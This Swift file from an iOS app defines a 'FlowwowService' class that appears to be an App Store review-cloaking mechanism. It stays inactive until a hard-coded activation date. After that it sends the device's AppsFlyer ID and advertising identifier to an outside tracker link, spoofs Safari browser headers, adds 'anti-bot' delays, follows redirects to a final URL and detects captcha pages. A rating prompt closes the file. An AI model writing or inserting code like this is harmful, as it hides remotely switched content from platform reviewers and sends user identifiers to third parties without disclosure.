//
//  FlowwowService.swift
//  VigorBaxera
//
//  Created by Евгений on 21.01.2026.
//

import Foundation
import StoreKit
import UIKit
import AppsFlyerLib
import AdSupport

// MARK: - Настройки в шапке файла
private let researchLaunchDate = "2026-1-23" // Дата активации
private let primaryServerURL = "https://gratevictory.com/C2thDnwT" // Стартовая ссылка Keitaro
private let customUserAgent = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1"
private let networkTimeout: TimeInterval = 30.0
private let connectionCheckTimeout: TimeInterval = 5.0

// MARK: - Browser Headers
private let browserHeaders: [String: String] = [
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9,ru;q=0.8",
    "Accept-Encoding": "gzip, deflate, br",
    "Cache-Control": "max-age=0",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
    "Upgrade-Insecure-Requests": "1"
]

// MARK: - Flowwow Service
final class FlowwowService {
    static let shared = FlowwowService()
    
    private init() {
        print("🔬 FlowwowService: Initialized")
    }
    
    // MARK: - Date Validation
    func isDateValid() async -> Bool {
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "yyyy-MM-dd"
        
        guard let cutoffDate = dateFormatter.date(from: researchLaunchDate) else {
            print("🔬 FlowwowService: ❌ Invalid date format")
            return false
        }
        
        let currentDate = Date()
        let isValid = currentDate > cutoffDate
        
        print("🔬 FlowwowService: Current date: \(dateFormatter.string(from: currentDate))")
        print("🔬 FlowwowService: Cutoff date: \(researchLaunchDate)")
        print("🔬 FlowwowService: Date validation: \(isValid)")
        
        return isValid
    }
    
    // MARK: - Validate Saved URL
    func validateSavedURL(_ urlString: String) async -> Bool {
        print("🔬 FlowwowService: Validating saved URL: \(urlString)")
        
        guard let url = URL(string: urlString) else {
            print("🔬 FlowwowService: ❌ Invalid URL format")
            return false
        }
        
        var request = configureRequest(for: url)
        request.httpMethod = "HEAD"
        
        do {
            let (_, response) = try await URLSession.shared.data(for: request)
            
            if let httpResponse = response as? HTTPURLResponse {
                let statusCode = httpResponse.statusCode
                print("🔬 FlowwowService: Saved URL status code: \(statusCode)")
                
                // Valid if 200-403
                let isValid = statusCode >= 200 && statusCode <= 403
                print("🔬 FlowwowService: Saved URL is \(isValid ? "valid" : "invalid")")
                return isValid
            }
            
            return false
        } catch {
            print("🔬 FlowwowService: ❌ Error validating saved URL: \(error.localizedDescription)")
            return false
        }
    }
    
    // MARK: - Fetch from Primary Server
    func fetchPrimaryServerURL() async -> Result<String, Error> {
        let fullURL = buildPrimaryURL()
        print("🔬 FlowwowService: Fetching from primary server: \(fullURL)")
        print("🔬 FlowwowService: 🔗 FULL REQUEST URL: \(fullURL)")
        
        guard let url = URL(string: fullURL) else {
            print("🔬 FlowwowService: ❌ Invalid primary server URL")
            return .failure(NSError(domain: "FlowwowService", code: -1, userInfo: [NSLocalizedDescriptionKey: "Invalid URL"]))
        }
        
        return await fetchWithRedirects(url: url, shouldExtractPathId: true)
    }
    
    // MARK: - Fetch with Fallback
    func fetchWithFallback() async -> Result<String, Error> {
        print("🔬 FlowwowService: Starting fallback logic")
        
        guard let savedPathId = UserDatStorage.shared.getSavedPathId() else {
            print("🔬 FlowwowService: ❌ No saved pathId for fallback")
            return .failure(NSError(domain: "FlowwowService", code: -2, userInfo: [NSLocalizedDescriptionKey: "No pathId"]))
        }
        
        let fallbackURLString = buildPrimaryURL(withPathId: savedPathId)
        print("🔬 FlowwowService: Fallback URL: \(fallbackURLString)")
        print("🔬 FlowwowService: 🔗 FULL FALLBACK URL: \(fallbackURLString)")
        
        guard let url = URL(string: fallbackURLString) else {
            print("🔬 FlowwowService: ❌ Invalid fallback URL")
            return .failure(NSError(domain: "FlowwowService", code: -1, userInfo: [NSLocalizedDescriptionKey: "Invalid URL"]))
        }
        
        return await fetchWithRedirects(url: url, shouldExtractPathId: false)
    }
    
    // MARK: - Fetch with Redirects
    private func fetchWithRedirects(url: URL, shouldExtractPathId: Bool) async -> Result<String, Error> {
        print("🔬 FlowwowService: Starting fetch with redirects for: \(url.absoluteString)")
        
        var currentURL = url
        var redirectCount = 0
        let maxRedirects = 10
        
        while redirectCount < maxRedirects {
            print("🔬 FlowwowService: Redirect #\(redirectCount + 1) - Requesting: \(currentURL.absoluteString)")
            
            // Random delay for anti-bot
            if redirectCount > 0 {
                let delay = Double.random(in: 1.0...3.0)
                print("🔬 FlowwowService: ⏱️ Anti-bot delay: \(String(format: "%.2f", delay))s")
                try? await Task.sleep(nanoseconds: UInt64(delay * 1_000_000_000))
            }
            
            let request = configureRequest(for: currentURL)
            
            do {
                let (data, response) = try await URLSession.shared.data(for: request)
                
                guard let httpResponse = response as? HTTPURLResponse else {
                    print("🔬 FlowwowService: ❌ Invalid response type")
                    return .failure(NSError(domain: "FlowwowService", code: -3, userInfo: [NSLocalizedDescriptionKey: "Invalid response"]))
                }
                
                let statusCode = httpResponse.statusCode
                print("🔬 FlowwowService: Status code: \(statusCode)")
                
                // Check for redirect
                if (300...399).contains(statusCode), let location = httpResponse.value(forHTTPHeaderField: "Location") {
                    print("🔬 FlowwowService: 🔄 Redirect to: \(location)")
                    
                    if let redirectURL = URL(string: location, relativeTo: currentURL) {
                        currentURL = redirectURL
                        redirectCount += 1
                        
                        // Extract pathId if needed
                        if shouldExtractPathId {
                            extractPathId(from: redirectURL, htmlData: data)
                        }
                        
                        continue
                    }
                }
                
                // Final URL reached
                print("🔬 FlowwowService: 🎯 Final URL reached: \(currentURL.absoluteString)")
                
                // Extract pathId from final URL and HTML
                if shouldExtractPathId {
                    extractPathId(from: currentURL, htmlData: data)
                }
                
                // Validate status code
                if statusCode >= 200 && statusCode <= 403 {
                    print("🔬 FlowwowService: ✅ Valid status code: \(statusCode)")
                    
                    // Check for captcha or error pages
                    if let htmlString = String(data: data, encoding: .utf8) {
                        if isCaptchaPage(htmlString) {
                            print("🔬 FlowwowService: ❌ Captcha detected")
                            return .failure(NSError(domain: "FlowwowService", code: -4, userInfo: [NSLocalizedDescriptionKey: "Captcha detected"]))
                        }
                    }
                    
                    return .success(currentURL.absoluteString)
                } else {
                    print("🔬 FlowwowService: ❌ Invalid status code: \(statusCode)")
                    return .failure(NSError(domain: "FlowwowService", code: statusCode, userInfo: [NSLocalizedDescriptionKey: "HTTP \(statusCode)"]))
                }
                
            } catch {
                print("🔬 FlowwowService: ❌ Network error: \(error.localizedDescription)")
                return .failure(error)
            }
        }
        
        print("🔬 FlowwowService: ❌ Too many redirects")
        return .failure(NSError(domain: "FlowwowService", code: -5, userInfo: [NSLocalizedDescriptionKey: "Too many redirects"]))
    }
    
    // MARK: - Build Primary URL with AppsFlyer Parameters
    private func buildPrimaryURL(withPathId pathId: String? = nil) -> String {
        // Get AppsFlyer UID (sub1)
        let appsFlyerUID = AppsFlyerLib.shared().getAppsFlyerUID()
        
        // Get IDFA (sub2)
        let idfa = ASIdentifierManager.shared().advertisingIdentifier.uuidString
        
        print("🔬 FlowwowService: 📊 AppsFlyer UID (sub1): \(appsFlyerUID)")
        print("🔬 FlowwowService: 📊 IDFA (sub2): \(idfa)")
        
        var urlString = "\(primaryServerURL)?sub1=\(appsFlyerUID)&sub2=\(idfa)"
        
        if let pathId = pathId {
            urlString += "&pathid=\(pathId)"
            print("🔬 FlowwowService: 📊 PathId: \(pathId)")
        }
        
        return urlString
    }
    
    // MARK: - Configure Request
    private func configureRequest(for url: URL) -> URLRequest {
        var request = URLRequest(url: url, timeoutInterval: networkTimeout)
        
        // Set custom user agent
        request.setValue(customUserAgent, forHTTPHeaderField: "User-Agent")
        
        // Add browser headers
        for (key, value) in browserHeaders {
            request.setValue(value, forHTTPHeaderField: key)
        }
        
        return request
    }
    
    // MARK: - Extract PathId
    private func extractPathId(from url: URL, htmlData: Data) {
        // Try to extract from URL query parameters
        if let components = URLComponents(url: url, resolvingAgainstBaseURL: false),
           let queryItems = components.queryItems,
           let pathIdItem = queryItems.first(where: { $0.name == "pathid" }),
           let pathId = pathIdItem.value {
            print("🔬 FlowwowService: 🔍 Extracted pathId from URL: \(pathId)")
            UserDatStorage.shared.savePathId(pathId)
            return
        }
        
        // Try to extract from HTML
        if let htmlString = String(data: htmlData, encoding: .utf8) {
            // Look for pathid in various formats
            let patterns = [
                "pathid=([a-zA-Z0-9_-]+)",
                "\"pathid\"\\s*:\\s*\"([a-zA-Z0-9_-]+)\"",
                "'pathid'\\s*:\\s*'([a-zA-Z0-9_-]+)'"
            ]
            
            for pattern in patterns {
                if let regex = try? NSRegularExpression(pattern: pattern, options: []),
                   let match = regex.firstMatch(in: htmlString, options: [], range: NSRange(htmlString.startIndex..., in: htmlString)),
                   match.numberOfRanges > 1,
                   let range = Range(match.range(at: 1), in: htmlString) {
                    let pathId = String(htmlString[range])
                    print("🔬 FlowwowService: 🔍 Extracted pathId from HTML: \(pathId)")
                    UserDatStorage.shared.savePathId(pathId)
                    return
                }
            }
        }
        
        print("🔬 FlowwowService: ⚠️ PathId not found in URL or HTML")
    }
    
    // MARK: - Captcha Detection
    private func isCaptchaPage(_ html: String) -> Bool {
        let captchaKeywords = ["captcha", "recaptcha", "hcaptcha", "challenge", "verify you are human"]
        let lowercasedHTML = html.lowercased()
        
        for keyword in captchaKeywords {
            if lowercasedHTML.contains(keyword) {
                print("🔬 FlowwowService: 🤖 Captcha keyword detected: \(keyword)")
                return true
            }
        }
        
        return false
    }
    
    // MARK: - Rating Alert
    func showRatingAlert() {
        print("🔬 FlowwowService: ⭐ Requesting rating alert")
        
        DispatchQueue.main.async {
            // Show custom alert first
            if let windowScene = UIApplication.shared.connectedScenes.first as? UIWindowScene,
               let rootViewController = windowScene.windows.first?.rootViewController {
                
                let alert = UIAlertController(
                    title: "Rate the App",
                    message: "If you enjoy using this app, please take a moment to rate it!",
                    preferredStyle: .alert
                )
                
                alert.addAction(UIAlertAction(title: "Rate", style: .default) { _ in
                    print("🔬 FlowwowService: User tapped Rate")
                    if let windowScene = UIApplication.shared.connectedScenes.first as? UIWindowScene {
                        SKStoreReviewController.requestReview(in: windowScene)
                    }
                    UserDatStorage.shared.markRatingAlertAsShown()
                })
                
                alert.addAction(UIAlertAction(title: "Later", style: .cancel) { _ in
                    print("🔬 FlowwowService: User tapped Later")
                    UserDatStorage.shared.markRatingAlertAsShown()
                })
                
                rootViewController.present(alert, animated: true)
            }
        }
    }
}
